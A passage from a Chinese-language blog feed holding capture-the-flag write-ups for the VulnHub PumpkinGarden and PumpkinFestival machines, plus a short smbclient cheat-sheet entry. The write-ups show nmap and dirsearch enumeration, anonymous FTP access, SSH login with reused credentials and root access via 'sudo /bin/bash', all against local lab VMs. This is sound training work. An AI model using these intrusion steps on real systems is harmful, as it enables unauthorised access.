class="hljs-string">You can reach there through my backyard.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Here is the key to my backyard</span><br><span class="hljs-string">https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh</span><br></code></pre></td></tr></table></figure><p>提到的链接无法访问，又去搜索了一番（先搜这个网站发现已经关闭了，再直接搜这个文件路径，发现了 CVE 编号，根据 CVE 编号再进行搜索），发现这大概率是个提权的脚本</p><p><img src="/pic/dedece29a2038253b45e0cbf6fb77451_MD5.png"></p><p>那接下来的问题就是如何进入到系统内部，最起码要拿到 shell，这个脚本才有用（虽然找不到这个脚本了）</p><h2 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h2><p>尝试直接使用已经得到的两对口令来 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinGarden]<br>└─$ ssh goblin@192.168.56.141 -p 3535<br>The authenticity of host \<span class="hljs-string">&#x27;[192.168.56.141]:3535 ([192.168.56.141]:3535)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:mLTE3ZDFS+c1wgTIsHLdH7jtZFKpYoPljQRHRdH7IVo.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added \&#x27;</span>[192.168.56.141]:3535\<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">------------------------------------------------------------------------------</span><br><span class="hljs-string">                          Welcome to Mission-Pumpkin</span><br><span class="hljs-string">      All remote connections to this machine are monitored and recorded</span><br><span class="hljs-string">------------------------------------------------------------------------------</span><br><span class="hljs-string">goblin@192.168.56.141\&#x27;</span>s password: <br>Last login: Thu Jun 13 00:43:14 2019 from 192.168.1.106<br>goblin@Pumpkin:~$ <span class="hljs-built_in">whoami</span><br>goblin<br>goblin@Pumpkin:~$ <span class="hljs-built_in">id</span><br>uid=1002(goblin) gid=1002(goblin) <span class="hljs-built_in">groups</span>=1002(goblin),27(sudo)<br>goblin@Pumpkin:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:20:a9:84 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.141/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe20:a984/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>goblin@Pumpkin:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> goblin: <br>Matching Defaults entries <span class="hljs-keyword">for</span> goblin on Pumpkin:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User goblin may run the following commands on Pumpkin:<br>    (root) ALL, !/bin/su<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo -l 给出了很有意思的结果，这个用户可以使用 sudo 执行除了 su 以外的所有命令，那就简单了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">goblin@Pumpkin:~$ sudo /bin/bash<br>root@Pumpkin:~<span class="hljs-comment"># cd /root</span><br>root@Pumpkin:/root<span class="hljs-comment"># ls</span><br>PumpkinGarden_Key<br>root@Pumpkin:/root<span class="hljs-comment"># ls -alih</span><br>total 36K<br>131254 drwx------  3 root root 4.0K Jun 13  2019 .<br>     2 drwxr-xr-x 22 root root 4.0K Jun 11  2019 ..<br>164960 -rw-r--r--  1 root root   22 Jun 13  2019 .bash_logout<br>131227 -rw-r--r--  1 root root 3.1K Jun 11  2019 .bashrc<br> 21448 drwx------  2 root root 4.0K Jun 11  2019 .cache<br>142821 -rw-------  1 root root   17 Jun 13  2019 .nano_history<br>131226 -rw-r--r--  1 root root  140 Feb 20  2014 .profile<br>169390 -rw-r--r--  1 root root   25 Jun 13  2019 PumpkinGarden_Key<br>164957 -rw-r--r--  1 root root   66 Jun 11  2019 .selected_editor<br>root@Pumpkin:/root<span class="hljs-comment"># cat PumpkinGarden_Key</span><br>Q29uZ3JhdHVsYXRpb25zIQ==<br>root@Pumpkin:/root<span class="hljs-comment"># echo -n &quot;Q29uZ3JhdHVsYXRpb25zIQ==&quot; | base64 -d</span><br>Congratulations!root@Pumpkin:/root<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台靶机相比于作者上一台靶机来说难度降低了很多，也没有在爆破上设置考察点，甚至目录爆破都不需要，也没兔子洞，只要信息搜集能力不算差，应该都能很快拿下这台靶机。</p><p>补充：有两个口令，我运气好使用 goblin 用户就发现了 sudo -l 可以提权。而 scarecrow 用户实际上也可以 ssh 登录，只不过不具备 sudo -l 的权限</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>命令</title>
    <link href="/2023/09/669298aee5d3.html"/>
    <url>/2023/09/669298aee5d3.html</url>
    
    <content type="html"><![CDATA[<h1 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient //192.168.56.107/wave -U username%password<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>cheatsheet</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计</title>
    <link href="/2023/09/886aeee73d5e.html"/>
    <url>/2023/09/886aeee73d5e.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3dea44cf9affe43ead1bf00f907f903bc15ca9c8cc4598aabd7a91df4353b866">91c22b0949579c4c6d0a72472c3796005314198df07df9cbbc9ef35e105a9660e5adfc3b832d50414f4625589dc1d9efcb3c548654ea7af667fd51b12168358ac3d8ee4d6c15776681a7eb9b8dc44949c0b607419d8b3ab538ea7c9f98f4c3900affebe0d68c110a71d40cb9c2053f5035026882b751bfebd984604dee357a55f8432bfa0a8082f3e754803604f12131d554f6e060c4a14caeb1787b5688b72790d5dc114070a602c868a8e9b3bb196c31b63637cca89ca552575c73f2763525e93ecb34b994d8bfae880507209221936920d769a974265357ea51d3ab12c60587576c5886dcd661a3804f643c9d39b50b6867c49804583387d4783247056694a6b631b203d5ee8a477600979cc4d407872f279a0e19f634c2785f7032b22f8389e94465d953c8faf53d3e6f407c467402c35081721590a9b0acea1d03c42c56deb65203e1186d895d62da2e7ba26be886c43f2ebb2df00bfde14abe3d613f28c47a9298061c98815f184432596a1c44d9664b0892815332bb53f791af1f1d295a9f927d83e6f6968d6932e92634f715f81c27f085b7922f666f810176ff59fdfb547133c5d0e12e13ae7efa29189884c943d93098a54450f4e2da6c444df8129590199c8c86c20f5349fffbf56d261dc7d2846f1901ca1c5b1b7b189a89debd77f971c334605f8d62f2b5b9992c25e41d37c1cd5c8c888bcf4814f75dbde068adca5fd198527cf992e1501eda9dbf71a72c5bdd34f199b0871a52a1323c020ec6d2b6352bcc770b325e790a4f035de1b17c207ad997e8b4432b4e8fb4f26e66</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>technique</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PumpkinFestival 靶机</title>
    <link href="/2023/09/5c91d82f7083.html"/>
    <url>/2023/09/5c91d82f7083.html</url>
    
    <content type="html"><![CDATA[<h1 id="PumpkinFestival-靶机"><a href="#PumpkinFestival-靶机" class="headerlink" title="PumpkinFestival 靶机"></a>PumpkinFestival 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.140      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:47 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> pumpkins.local (192.168.56.140)<br>Host is up (0.00016s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>6880/tcp open  unknown<br>MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开放了 21, 80, 6880 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo nmap -sT -sV -sC -O -p21,80,6880 192.168.56.140<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> pumpkins.local (192.168.56.140)<br>Host is up (0.00046s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to 192.168.56.106<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.2 - secure, fast, stable<br>|_End of status<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_drwxr-xr-x    2 0        0            4096 Jul 12  2019 secret<br>80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Pumpkin Festival &amp;<span class="hljs-comment">#8211; PumpkinToken : 06c3eb12ef2389e2752335...</span><br>|_http-generator: WordPress 4.9.3<br>6880/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 eb:cb:da:b3:be:b6:c8:0a:8b:6e:d5:bc:51:f7:9c:11 (DSA)<br>|   2048 19:6b:6e:d3:8a:fa:a9:73:05:5e:ac:af:28:ff:55:b8 (RSA)<br>|   256 00:a0:f2:8c:5e:a7:7e:7b:7b:d4:72:c3:ad:41:79:3b (ECDSA)<br>|_  256 aa:04:61:9a:ca:19:90:c3:55:3c:<span class="hljs-built_in">fc</span>:cc:1a:05:be:3f (ED25519)<br>MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>21 端口允许匿名登陆，80 端口是 Apache 搭建的服务，title 中包含了 <code>PumpkinToken</code>，WordPress 4.9.3，操作系统是 Ubuntu。接下来 nmap 漏扫的同时去 ftp 看看文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ftp 192.168.56.140<br>Connected to 192.168.56.140.<br>220 Welcome to Pumpkin\<span class="hljs-string">&#x27;s FTP service.</span><br><span class="hljs-string">Name (192.168.56.140:kali): anonymous</span><br><span class="hljs-string">331 Please specify the password.</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">230 Login successful.</span><br><span class="hljs-string">Remote system type is UNIX.</span><br><span class="hljs-string">Using binary mode to transfer files.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||28051|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">drwxr-xr-x    2 0        0            4096 Jul 12  2019 secret</span><br><span class="hljs-string">226 Directory send OK.</span><br><span class="hljs-string">ftp&gt; pwd</span><br><span class="hljs-string">Remote directory: /</span><br><span class="hljs-string">ftp&gt; binary</span><br><span class="hljs-string">200 Switching to Binary mode.</span><br><span class="hljs-string">ftp&gt; cd secret</span><br><span class="hljs-string">250 Directory successfully changed.</span><br><span class="hljs-string">ftp&gt; ls</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||57147|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">-rw-r--r--    1 0        0              48 Jul 12  2019 token.txt</span><br><span class="hljs-string">226 Directory send OK.</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> token.txt <br>PumpkinToken : 2d6dbbae84d724409606eddd9dd71265<br><span class="hljs-comment"># 第一个PumpkinToken</span><br></code></pre></td></tr></table></figure><p>拿到了一个<code>PumpkinToken</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo nmap --script=vuln -p21,80,6880 192.168.56.140<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 02:50 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> pumpkins.local (192.168.56.140)<br>Host is up (0.00046s latency).<br><br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>| http-enum: <br>|   /wp-login.php: Possible admin folder<br>|   /: WordPress version: 4.9.3<br>|   /wp-includes/images/rss.png: Wordpress version 2.2 found.<br>|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.<br>|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.<br>|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.<br>|   /wp-login.php: Wordpress login page.<br>|   /wp-admin/upgrade.php: Wordpress login page.<br>|_  /readme.html: Interesting, a readme.<br>6880/tcp open  unknown<br>MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>nmap 漏扫显示了一些 wordpress 的路径和文件。</p><h2 id="Web-查看"><a href="#Web-查看" class="headerlink" title="Web 查看"></a>Web 查看</h2><p><img src="/pic/b772d805540fbd31db5ef0194bc2d49d_MD5.png"></p><p><code>PumpkinTokens can help you get to your pumpkins.</code> 可能是在暗示 <code>PumpkinTokens</code> 的值是密码。不过获得的 <code>PumpkinTokens</code> 有点多啊。同时在这里发现了两个用户名 <code>jack</code>, <code>harry</code></p><p>观察源代码发现</p><p><img src="/pic/e9f423e0f74bc35e5988f2899680969f_MD5.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">45</span>d9ee7239bc6b0bb21d3f8e1c5faa52<br><span class="hljs-comment"># 第二个PumpkinToken</span><br></code></pre></td></tr></table></figure><p>不过 nmap 扫出来的标题中也带有 <code>PumpkinToken</code>，这里查看源代码并没有发现</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo dirsearch -u http://192.168.56.140/           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.140/-_23-09-10_03-08-01.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-09-10_03-08-01.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.140/<br><br>[03:08:01] Starting: <br>[03:08:02] 403 -  292B  - /.ht_wsr.txt                                     <br>[03:08:02] 403 -  295B  - /.htaccess.bak1<br>[03:08:02] 403 -  297B  - /.htaccess.sample<br>[03:08:02] 403 -  295B  - /.htaccess.orig<br>[03:08:02] 403 -  295B  - /.htaccess_orig<br>[03:08:02] 403 -  296B  - /.htaccess_extra<br>[03:08:02] 403 -  293B  - /.htaccess_sc<br>[03:08:02] 403 -  294B  - /.htaccessOLD2<br>[03:08:02] 403 -  295B  - /.htaccess.save<br>[03:08:02] 403 -  293B  - /.htaccessOLD<br>[03:08:02] 403 -  285B  - /.htm<br>[03:08:02] 403 -  286B  - /.html<br>[03:08:02] 403 -  293B  - /.htaccessBAK                                    <br>[03:08:02] 403 -  295B  - /.htpasswd_test<br>[03:08:02] 403 -  292B  - /.httr-oauth<br>[03:08:02] 403 -  291B  - /.htpasswds<br>[03:08:03] 403 -  285B  - /.php                                            <br>[03:08:03] 403 -  286B  - /.php3                                           <br>[03:08:21] 301 -  313B  - /img  -&gt;  http://192.168.56.140/img/              <br>[03:08:21] 200 -    1KB - /index.html                                       <br>[03:08:30] 200 -  102B  - /robots.txt                                       <br>[03:08:31] 403 -  294B  - /server-status                                    <br>[03:08:31] 403 -  295B  - /server-status/                                   <br>[03:08:33] 301 -  315B  - /store  -&gt;  http://192.168.56.140/store/          <br>[03:08:35] 301 -  315B  - /users  -&gt;  http://192.168.56.140/users/          <br>[03:08:35] 403 -  287B  - /users/<br></code></pre></td></tr></table></figure><p>robots.txt 中的内容如下</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade">User-agent: * <br>Disallow: <span class="hljs-regexp">/wordpress/</span><br>Disallow: <span class="hljs-regexp">/tokens/</span><br>Disallow: <span class="hljs-regexp">/users/</span><br>Disallow: <span class="hljs-regexp">/store/</span>track.txt<br></code></pre></td></tr></table></figure><p>访问发现只有 <code>/store/track.txt</code> 可以访问，tokens 和 users 返回 403，wordpress 返回 404。<code>/store/track.txt</code> 的内容如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">Hey Jack<span class="hljs-operator">!</span><br><br>Thanks <span class="hljs-keyword">for</span> choosing our <span class="hljs-keyword">local</span> store. Hope you <span class="hljs-keyword">like</span> the services.<br>Tracking code : <span class="hljs-number">2542</span> <span class="hljs-number">8231</span> <span class="hljs-number">6783</span> <span class="hljs-number">486</span><br><br><span class="hljs-operator">-</span>Regards <br>admin<span class="hljs-variable">@pumpkins</span>.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure><p>tracking code 不知道怎么利用，先记录下来，这里的邮箱后缀有点意思，感觉可能是这个网站的域名。在 hosts 文件中添加此域名和 IP 的映射。再访问此域名</p><p><img src="/pic/8845d132ce1b430e244256f656870f14_MD5.png"></p><p>有意思，这里又拿到了一个，而且就是 nmap 扫描结果中的那个<code>PumpkinToken</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">06</span>c3eb12ef2389e2752335beccfb2080<br><span class="hljs-comment"># 第三个PumpkinToken</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo dirsearch -u http://pumpkins.local/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/pumpkins.local/-_23-09-10_03-16-02.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-09-10_03-16-02.<span class="hljs-built_in">log</span><br><br>Target: http://pumpkins.local/<br><br>[03:16:02] Starting: <br>[03:16:04] 403 -  292B  - /.ht_wsr.txt                                     <br>[03:16:04] 403 -  295B  - /.htaccess.bak1<br>[03:16:04] 403 -  297B  - 